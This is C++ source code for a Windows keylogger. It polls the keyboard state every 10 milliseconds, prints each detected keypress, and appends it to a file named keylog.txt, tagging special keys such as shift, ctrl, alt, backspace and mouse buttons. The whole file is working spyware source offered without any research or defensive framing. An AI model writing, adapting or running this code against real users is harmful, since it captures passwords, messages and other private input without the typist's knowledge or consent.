#include <windows.h>
#include <iostream>

using namespace std;

int log(char key, const char *file)
{

    FILE *out_file;
    out_file = fopen(file, "a+");

    // Deals with special keys

    switch (key)
    {
    case VK_SHIFT:
        fprintf(out_file, " [shift] ");
        break;
    case VK_CONTROL:
        fprintf(out_file, " [ctrl] ");
        break;
    case VK_MENU:
        fprintf(out_file, " [alt] ");
        break;
    case VK_BACK:
        fprintf(out_file, " [backspace] ");
        break;
    case VK_TAB:
        fprintf(out_file, " [tab] ");
        break;
    case VK_CAPITAL:
        fprintf(out_file, " [caps lock] ");
        break;
    case VK_LBUTTON:
        fprintf(out_file, " [Lbutton] ");
        break;
    case VK_RBUTTON:
        fprintf(out_file, " [Rbutton] ");
        break;
    default:

        // Deals with uppercase and lowercase letters

        bool isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        short capsLockState = GetKeyState(VK_CAPITAL);

        if (key >= 'A' && key <= 'Z')
        {
            if (!isShiftPressed || (isShiftPressed && (capsLockState & 1)))
            {
                key = tolower(key);
            }
        }

        fprintf(out_file, "%c", key);
        break;
    }

    fclose(out_file);
    return 0;
}

int main()
{

    char key;

    while (true)
    {
        Sleep(10); // 10 milliseconds

        for (key = 8; key <= 255; key++) // ASCII Character Range
        {
            if (GetAsyncKeyState(key) == -32767) // If Key is pressed
            {
                cout << key;
                log(static_cast<char>(key), "keylog.txt");
            }
        }
    }

    return 0;
}
